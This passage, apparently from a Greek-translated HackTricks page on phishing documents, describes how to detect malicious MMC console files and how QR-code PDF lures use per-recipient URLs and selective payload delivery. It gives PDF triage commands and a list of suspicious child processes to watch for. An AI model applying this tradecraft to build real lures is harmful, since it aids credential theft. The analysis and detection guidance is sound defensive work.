Σημαντικά pivots κατά το runtime είναι όταν το `mmc.exe` φορτώνει το CLR ή components script, δημιουργεί συνδέσεις δικτύου ή εκκινεί τα `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ή κάποιο μη αναμενόμενο εκτελέσιμο. Η μορφή είναι νόμιμη, επομένως οι ανιχνεύσεις θα πρέπει να συσχετίζουν την **προέλευση + ύποπτο περιεχόμενο XML/script + συμπεριφορά του `mmc.exe`**, αντί να αποκλείουν κάθε MSC.<sup>[[9]](#references)</sup>

## PDF/QR ανακατευθυντές και επιλεκτική παράδοση payload

Ένα PDF δεν χρειάζεται exploit για να είναι χρήσιμο. Πρόσφατες καμπάνιες τοποθετούν έναν **κωδικό QR ή έναν συνηθισμένο σύνδεσμο** σε ένα έγγραφο που φαίνεται ακίνδυνο, μεταφέρουν την περίοδο λειτουργίας του browser εκτός των ελέγχων του email και εξατομικεύουν τον προορισμό με τη διεύθυνση του παραλήπτη. Η Microsoft τεκμηρίωσε PDF του 2025 με διευθύνσεις URL QR μοναδικές για κάθε παραλήπτη, οι οποίες οδηγούσαν σε υποδομή υποκλοπής διαπιστευτηρίων RaccoonO365. Μια παράλληλη αλυσίδα χρησιμοποιούσε ελέγχους βάσει IP/περιβάλλοντος, ώστε να επιστρέφει διαδρομή JavaScript/MSI σε επιλεγμένους επισκέπτες, αλλά ένα ακίνδυνο PDF σε σαρωτές ή μη επιτρεπόμενους clients.<sup>[[10]](#references)</sup>

Κάντε διαλογή τόσο των ενεργειών PDF όσο και των QR codes που αποδίδονται. Ένας QR μπορεί να είναι σχεδιασμένος με διανυσματικά γραφικά και όχι αποθηκευμένος ως εικόνα που μπορεί να εξαχθεί, επομένως μετατρέψτε κάθε σελίδα σε raster εικόνα, καθώς και εξαγάγετε τις ενσωματωμένες εικόνες:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Επιθεωρήστε τους αποκωδικοποιημένους προορισμούς και τις ανακατευθύνσεις από ένα απομονωμένο σύστημα ανάλυσης, χωρίς να κάνετε authentication. Χρήσιμα χαρακτηριστικά για την αναζήτηση περιλαμβάνουν PDF που περιέχουν μόνο QR code και σχεδόν κενά σώματα email, τη διεύθυνση email του παραλήπτη ενσωματωμένη σε παράμετρο query, αρκετές ανακατευθύνσεις μέσω αξιόπιστων υπηρεσιών hosting και διαφορετικό περιεχόμενο ανάλογα με την IP, τη γεωγραφική θέση, τα cookies, το referrer ή το user agent. Συγκρίνετε αιτήματα με ελεγχόμενα προφίλ, επειδή ένα μεμονωμένο αίτημα από sandbox μπορεί να λάβει μόνο το παραπλανητικό περιεχόμενο.<sup>[[10]](#references)</sup>

## Αρχεία Windows για υποκλοπή NTLM hashes

Δείτε τη σελίδα σχετικά με τα **σημεία υποκλοπής NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Macro LibreOffice → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Καμπάνια ZipLine: Μια εξελιγμένη επίθεση phishing με στόχο εταιρείες στις ΗΠΑ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Παρακολούθηση του tradecraft του Dropping Elephant μέσω αλυσίδας loader με θέμα την Κίνα](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Νέα τεχνική persistence COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Ο loader PhantomVAI διανέμει διάφορα infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Εκτέλεση μέσω proxy αξιόπιστων εργαλείων προγραμματιστών: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console για αρχική πρόσβαση και evasion](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Οι φορείς απειλών αξιοποιούν τη φορολογική περίοδο για να εξαπολύσουν καμπάνιες phishing με φορολογικό θέμα](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Αλυσίδα παράδοσης UAT-11587 και backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - Η BITTER επεκτείνει το οπλοστάσιό της με το PapRAT](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - Εντολή ftp](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - Custom Action Type 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn - Επιλογές επεξεργασίας επιστρεφόμενων τιμών Custom Action](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
